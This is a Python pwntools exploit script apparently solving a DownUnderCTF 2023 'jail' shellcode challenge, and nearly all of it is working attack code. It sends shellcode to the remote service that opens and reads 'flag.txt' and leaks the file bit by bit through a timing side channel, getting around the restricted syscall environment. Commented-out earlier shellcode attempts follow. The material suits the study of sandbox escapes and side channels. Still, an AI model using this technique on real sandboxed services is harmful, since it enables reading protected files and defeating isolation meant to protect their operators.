from pwn import *
fn = "./jail"
# context.log_level = "debug"
elf = ELF(fn, checksec=False)
context.binary = elf
libc = elf.libc
real = True
if real:
    p = process(fn)
    # p = remote("", 0)
else:
    p = gdb.debug(fn, """
    b *(main+0xc5)
    c
    """)
sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")
def gen_fmt(start, end):
    buf = ""
    for x in range(start, end):
        buf += f"%{x}$p."
    return buf[:-1]

# ======================================
# Exploit goes here

from pwn import *
import time

def get_byte(offset):

    bin_str = ''

    for bit_offset in range(8):

        # proc = remote('win.the.seetf.sg', 2002)
        # proc = process(fn)
        proc = remote("2023.ductf.dev", 30010)

        # At this point rdi (first argument) is already set to 0.
        # Before entering our shellcode, rdx is already set to the address of our shellcode.
        # We can use this value as the 2nd argument to read.
        #    0x00005653ecfdc3ab <+514>:   mov    rax,QWORD PTR [rip+0x2cae]        # 0x5653ecfdf060 <shellcode_mem>
        #    0x00005653ecfdc3b2 <+521>:   mov    rdx,rax
        #    0x00005653ecfdc3b5 <+524>:   mov    eax,0x0
        #    0x00005653ecfdc3ba <+529>:   call   rdx
        # We don't have to modify the 3rd argument because rdx is large enough for our shellcode.

        stage2 = asm(("""
        .rept 0x6
        nop
        .endr
        """  +  # 
"""mov rax, 0x101
mov rdi, -100
mov rbx, 0x7478742e67616c66
push 0x0
push rbx
mov rsi, rsp
mov rdx, 0x0
syscall"""
            + shellcraft.amd64.linux.read('rax', 'rsp', 0x100)
            + f"""
            xor r11, r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit_offset}
            shl al, 7
            shr al, 7
        loop:
            cmp rax, r11
            je end
            jmp loop
        end:
        """
        ), arch='amd64')

        proc.sendlineafter(b">", stage2)
        start = time.time()
        proc.recvall(timeout=2).decode()
        now = time.time()

        if (now - start) > 1:
            bin_str += '1'
        else:
            bin_str += '0'

        print(bin_str)

    byte = int(bin_str[::-1], 2)

    return byte

flag = ''

for i in range(50):
    print(f'[+] Getting byte {i}...')
    b = chr(get_byte(i))
    flag += b

    print(flag)

    if b == '}':
        break

# payload = asm("""mov rax, 0x101
# mov rdi, -100
# push 0x41424344
# mov rsi, rsp
# mov rdx, 0x0
# syscall
# mov rdi, rax
# mov rax, 0x0
# mov rsi, rsp
# mov rdx, 100
# syscall
# mov rcx, [rsp]
# cmp cl, 101
# jg label
# mov rax, 0x3c
# syscall
# label:
# mov rax, 0x23
# mov QWORD PTR [rbp-0x30],0x5
# mov QWORD PTR [rbp-0x28],0x64
# lea rsi, [rbp-0x20]
# lea rdi, [rbp-0x30]
# syscall
# """)
# sla(b">", payload)

# p.interactive()